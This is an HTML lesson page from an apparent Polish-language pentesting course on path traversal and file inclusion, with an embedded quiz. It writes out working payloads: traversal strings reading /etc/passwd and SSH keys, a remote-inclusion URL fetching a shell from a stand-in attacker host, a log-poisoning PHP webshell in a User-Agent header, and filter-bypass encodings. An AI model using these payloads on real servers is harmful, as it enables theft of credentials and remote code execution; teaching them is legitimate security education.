<!DOCTYPE html>
<html lang="pl">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lekcja 12: Path Traversal (LFI) - Kurs Pentestera</title>

    <link rel="stylesheet" href="style.css">

    <style>
        /* Akcent: Radioactive Yellow (System Files & Logs) */
        :root {
            --accent: #c6ff00;
            --accent-glow: rgba(198, 255, 0, 0.3);
        }

        .path {
            color: #00e5ff;
            font-family: monospace;
        }

        .wrapper {
            color: #ff4081;
            font-weight: bold;
        }
    </style>
</head>

<body>

    <div class="container">
        <header>
            <h1>PATH TRAVERSAL & LFI</h1>
            <p>MODU≈Å 12: Wycieczki po serwerze, /etc/passwd i Log Poisoning</p>
        </header>

        <!-- 1. MECHANIZM -->
        <section>
            <h2>> WYJ≈öCIE Z WIƒòZIENIA (ROOT)</h2>
            <p>Aplikacje webowe powinny mieƒá dostƒôp tylko do swojego folderu (np. <code>/var/www/html</code>). Path
                Traversal to b≈ÇƒÖd, kt√≥ry pozwala "wyj≈õƒá" wy≈ºej i czytaƒá pliki systemowe.</p>

            <div class="card">
                <h3>MAGICZNY CIƒÑG: ../</h3>
                <p>W systemach Linux/Windows dwie kropki oznaczajƒÖ "katalog wy≈ºej".</p>
                <p>Je≈õli aplikacja robi tak (PHP):</p>
                <pre><code>include("pages/" . $_GET['file']);</code></pre>

                <p>A Ty wy≈õlesz:</p>
                <pre><code>?file=<span class="path">../../../../etc/passwd</span></code></pre>

                <p>Serwer skleja to w: <code>pages/../../../../etc/passwd</code>. <br>System operacyjny ignoruje
                    <code>pages/../</code> i otwiera plik z has≈Çami/u≈ºytkownikami.</p>
            </div>
        </section>

        <!-- 2. LFI vs RFI -->
        <section>
            <h2>> LFI vs RFI</h2>
            <p>Wyr√≥≈ºniamy dwa rodzaje tego ataku (Inclusion):</p>

            <div class="card">
                <h3>1. LFI (Local File Inclusion)</h3>
                <p>Wczytujesz plik, kt√≥ry <strong>ju≈º jest</strong> na serwerze ofiary.</p>
                <ul>
                    <li><strong>Cele:</strong> Pliki konfiguracyjne (<code>wp-config.php</code>), pliki systemowe
                        (<code>/etc/passwd</code>, <code>C:\Windows\win.ini</code>), klucze SSH
                        (<code>/root/.ssh/id_rsa</code>).</li>
                    <li><strong>Wrappers:</strong> Mo≈ºesz u≈ºyƒá
                        <code>php://filter/convert.base64-encode/resource=index.php</code>, aby odczytaƒá kod ≈∫r√≥d≈Çowy
                        aplikacji (zakodowany w base64), zamiast go wykonywaƒá.</li>
                </ul>
            </div>

            <div class="card">
                <h3>2. RFI (Remote File Inclusion) - Rzadkie</h3>
                <p>Zmuszasz serwer, by pobra≈Ç i wykona≈Ç skrypt z <strong>Twojego</strong> serwera.</p>
                <pre><code>?file=http://hacker.com/shell.php</code></pre>
                <p>Je≈õli zadzia≈Ça -> Masz RCE natychmiast. (Wymaga <code>allow_url_include=On</code> w PHP, co jest
                    domy≈õlnie wy≈ÇƒÖczone od lat).</p>
            </div>
        </section>

        <!-- 3. ESKALACJA -->
        <section>
            <h2>> LOG POISONING (LFI -> RCE) ‚ò†Ô∏è</h2>
            <p>Masz LFI, mo≈ºesz czytaƒá pliki. Ale chcesz <strong>wykonaƒá kod</strong> (RCE). Jak to zrobiƒá, je≈õli nie
                mo≈ºesz wgraƒá pliku?</p>
            <p>Musisz "zatruƒá" plik, kt√≥ry ju≈º tam jest (np. log serwera).</p>

            <div class="card">
                <h3>SCENARIUSZ ATAKU</h3>
                <ol>
                    <li><strong>Zlokalizuj logi:</strong> Przez LFI znajdujesz plik
                        <code>/var/log/apache2/access.log</code>. Widzisz tam historiƒô odwiedzin.</li>
                    <li><strong>Wstrzyknij kod:</strong> Wysy≈Çasz ≈ºƒÖdanie do serwera, zmieniajƒÖc sw√≥j
                        <strong>User-Agent</strong> na kod PHP:
                        <pre><code>User-Agent: &lt;?php system($_GET['cmd']); ?&gt;</code></pre>
                        Serwer zapisuje to w logu.
                    </li>
                    <li><strong>Odpal bombƒô:</strong> Przez LFI wczytujesz zatruty log:
                        <pre><code>?file=/var/log/apache2/access.log&cmd=id</code></pre>
                    </li>
                    <li><strong>Efekt:</strong> Serwer parsuje plik logu, napotyka Tw√≥j kod PHP i go wykonuje. Masz
                        Shell.</li>
                </ol>
            </div>
        </section>

        <!-- 4. BYPASSING -->
        <section>
            <h2>> OMIJANIE FILTR√ìW</h2>
            <p>Programi≈õci pr√≥bujƒÖ blokowaƒá <code>../</code>. Jak to obej≈õƒá?</p>
            <div class="card">
                <ul>
                    <li><strong>URL Encoding:</strong> <code>%2e%2e%2f</code> (../)</li>
                    <li><strong>Double Encoding:</strong> <code>%252e%252e%252f</code> (Dzia≈Ça, je≈õli serwer dekoduje
                        input dwa razy).</li>
                    <li><strong>Null Byte (Stare systemy):</strong> <code>../../etc/passwd%00</code> (Obcina
                        rozszerzenie .php, kt√≥re serwer dokleja na si≈Çƒô).</li>
                </ul>
            </div>
        </section>

        <!-- CHECKLIST -->
        <section>
            <h2>CHECKLISTA / RED FLAGS</h2>
            <div class="card checklist-card">
                <div class="checklist-item">
                    <span class="check-icon">‚ö†</span>
                    <div><strong>Parametry plikowe:</strong> `?page=`, `?file=`, `?lang=pl`, `?template=`. To g≈Ç√≥wne
                        cele LFI.</div>
                </div>
                <div class="checklist-item">
                    <span class="check-icon">‚ö†</span>
                    <div><strong>Cookie z nazwƒÖ jƒôzyka:</strong> Ciasteczko `lang=en` mo≈ºe byƒá u≈ºywane do inkludowania
                        pliku `en.php`. Zmie≈Ñ na `../../../../etc/passwd`.</div>
                </div>
                <div class="checklist-item">
                    <span class="check-icon">‚ö†</span>
                    <div><strong>Wyciek ≈õcie≈ºek w b≈Çƒôdach:</strong> Je≈õli widzisz b≈ÇƒÖd: `Failed to open stream:
                        /var/www/html/include/...`, wiesz, gdzie jeste≈õ w systemie.</div>
                </div>
            </div>
        </section>

        <!-- QUIZ -->
        <section id="quiz-section">
            <h2>üéì WERYFIKACJA WIEDZY</h2>
            <div id="quiz-container"></div>
        </section>

        <footer>
            <p style="text-align: center; margin-top: 50px; color: #555;">&copy; 2026 Kurs Pentestera | Modu≈Ç 12</p>
        </footer>
    </div>

    <!-- DANE DO QUIZU -->
    <script>
        const quizData = [
            {
                question: "Co oznacza ciƒÖg znak√≥w '../' w systemach plik√≥w?",
                options: [
                    "Jest to komentarz.",
                    "Oznacza katalog bie≈ºƒÖcy.",
                    "Oznacza katalog nadrzƒôdny (wyj≈õcie poziom wy≈ºej).",
                    "Oznacza katalog root."
                ],
                correct: 2,
                explanation: "To fundament ataku Path Traversal. U≈ºywajƒÖc wielokrotnego `../` wychodzisz z folderu aplikacji a≈º do g≈Ç√≥wnego katalogu systemu (/)."
            },
            {
                question: "Jaki jest g≈Ç√≥wny cel ataku LFI (Local File Inclusion)?",
                options: [
                    "Usuniƒôcie bazy danych.",
                    "Odczytanie plik√≥w znajdujƒÖcych siƒô na serwerze (np. konfiguracyjnych, systemowych), do kt√≥rych u≈ºytkownik webowy nie powinien mieƒá dostƒôpu.",
                    "Przekierowanie u≈ºytkownika na innƒÖ stronƒô.",
                    "Zwiƒôkszenie uprawnie≈Ñ w bazie SQL."
                ],
                correct: 1,
                explanation: "LFI pozwala 'zajrzeƒá' do plik√≥w serwera. Czƒôsto pierwszym celem jest `/etc/passwd` (u≈ºytkownicy) lub pliki konfiguracyjne z has≈Çami do bazy."
            },
            {
                type: "scenario",
                question: "Chcesz odczytaƒá plik 'config.php', ale gdy robisz '?file=config.php', strona jest pusta (bo PHP siƒô wykona≈Ç, zamiast wy≈õwietliƒá). Jakiego triku (wrappera) u≈ºyjesz?",
                options: [
                    "php://input",
                    "php://filter/convert.base64-encode/resource=config.php",
                    "file://config.php",
                    "http://config.php"
                ],
                correct: 1,
                explanation: "To klasyk CTF-owy. Filtr Base64 sprawia, ≈ºe serwer nie wykonuje kodu PHP, tylko zwraca jego zakodowanƒÖ tre≈õƒá. Ty jƒÖ sobie odkodujesz u siebie i zobaczysz has≈Ça."
            },
            {
                question: "Na czym polega atak 'Log Poisoning'?",
                options: [
                    "Na usuniƒôciu log√≥w, ≈ºeby zatrzeƒá ≈õlady.",
                    "Na wstrzykniƒôciu z≈Ço≈õliwego kodu (np. PHP) do pliku log√≥w (np. poprzez User-Agent), a nastƒôpnie wczytaniu tego logu przez podatno≈õƒá LFI, co powoduje wykonanie kodu.",
                    "Na wys≈Çaniu zbyt du≈ºej ilo≈õci log√≥w (DoS).",
                    "Na zmianie uprawnie≈Ñ pliku log√≥w."
                ],
                correct: 1,
                explanation: "To technika zamiany LFI (czytanie plik√≥w) w RCE (wykonywanie kodu). Serwer sam zapisuje Tw√≥j z≈Ço≈õliwy kod w logu, a Ty go tylko 'inkludujesz'."
            },
            {
                question: "Czym r√≥≈ºni siƒô LFI od RFI?",
                options: [
                    "LFI dzia≈Ça na Linuxie, RFI na Windowsie.",
                    "LFI wczytuje pliki lokalne (z serwera ofiary), RFI wczytuje pliki zdalne (z serwera atakujƒÖcego, np. przez http://).",
                    "RFI jest bezpieczniejsze.",
                    "Nie ma r√≥≈ºnicy."
                ],
                correct: 1,
                explanation: "Remote File Inclusion (RFI) jest potƒô≈ºniejsze, bo od razu ≈Çadujesz swojego webshella z zewnƒÖtrz. Jednak nowoczesne konfiguracje PHP domy≈õlnie blokujƒÖ RFI."
            },
            {
                type: "scenario",
                question: "Widzisz URL: 'index.php?lang=pl'. Zmieniasz na 'index.php?lang=../../../../etc/passwd'. Strona wy≈õwietla: 'Warning: include(pl.php) failed'. Co powstrzyma≈Ço atak?",
                options: [
                    "Firewall.",
                    "Serwer dokleja rozszerzenie '.php' do Twojego inputu na ko≈Ñcu.",
                    "Brak uprawnie≈Ñ.",
                    "Plik nie istnieje."
                ],
                correct: 1,
                explanation: "Kod backendu prawdopodobnie wyglƒÖda tak: `include($_GET['lang'] . '.php');`. Dlatego serwer szuka≈Ç `/etc/passwd.php`, kt√≥ry nie istnieje."
            },
            {
                question: "Jaki plik jest klasycznym celem testowym Path Traversal na systemach Windows?",
                options: [
                    "C:\\Windows\\System32\\drivers\\etc\\hosts",
                    "C:\\Windows\\win.ini",
                    "C:\\Passwords.txt",
                    "D:\\Games"
                ],
                correct: 1,
                explanation: "Tak jak `/etc/passwd` na Linuxie, tak `win.ini` (lub `boot.ini` w starych systemach) jest standardowym plikiem, kt√≥ry zawsze istnieje i potwierdza podatno≈õƒá."
            },
            {
                question: "Co robi Null Byte (%00) w starych wersjach PHP/Java?",
                options: [
                    "Zeruje licznik odwiedzin.",
                    "M√≥wi systemowi, ≈ºe tu ko≈Ñczy siƒô ciƒÖg znak√≥w (String Terminator). Pozwala≈Ço to odciƒÖƒá doklejane rozszerzenie (np. .php).",
                    "Wywo≈Çuje b≈ÇƒÖd 500.",
                    "S≈Çu≈ºy do spacji."
                ],
                correct: 1,
                explanation: "W starszych systemach `passwd%00.php` by≈Ç interpretowany jako `passwd`. Wszystko po Null Byte by≈Ço ignorowane. (Naprawione w PHP 5.3.4+)."
            },
            {
                type: "scenario",
                question: "Pr√≥bujesz LFI, ale WAF blokuje ciƒÖg '../'. Co mo≈ºesz spr√≥bowaƒá?",
                options: [
                    "Zrezygnowaƒá.",
                    "U≈ºyƒá kodowania URL (np. %2e%2e%2f) lub podw√≥jnego kodowania (%252e%252e%252f).",
                    "Wpisaƒá spacje.",
                    "Zmieniƒá przeglƒÖdarkƒô."
                ],
                correct: 1,
                explanation: "Filtry czƒôsto dekodujƒÖ input tylko raz. Je≈õli wy≈õlesz podw√≥jnie zakodowany ciƒÖg, filtr przepu≈õci `%25...`, a backend zdekoduje to do `../` i wykona atak."
            },
            {
                question: "Jak najlepiej zabezpieczyƒá siƒô przed Path Traversal?",
                options: [
                    "Usuwaƒá kropki z inputu.",
                    "U≈ºywaƒá ID zamiast nazw plik√≥w (np. ?file_id=1) mapowanych na sztywno w kodzie, lub stosowaƒá ≈õcis≈ÇƒÖ Bia≈ÇƒÖ Listƒô (Allowlist) dozwolonych nazw plik√≥w.",
                    "Uruchomiƒá serwer jako root.",
                    "Ukryƒá nazwy plik√≥w."
                ],
                correct: 1,
                explanation: "Nigdy nie pozwalaj u≈ºytkownikowi decydowaƒá o ≈õcie≈ºce do pliku. Je≈õli musisz - sprawd≈∫, czy podana nazwa jest na kr√≥tkiej li≈õcie dozwolonych warto≈õci (np. ['pl', 'en', 'de'])."
            }
        ];
    </script>

    <script src="quiz.js"></script>

</body>

</html>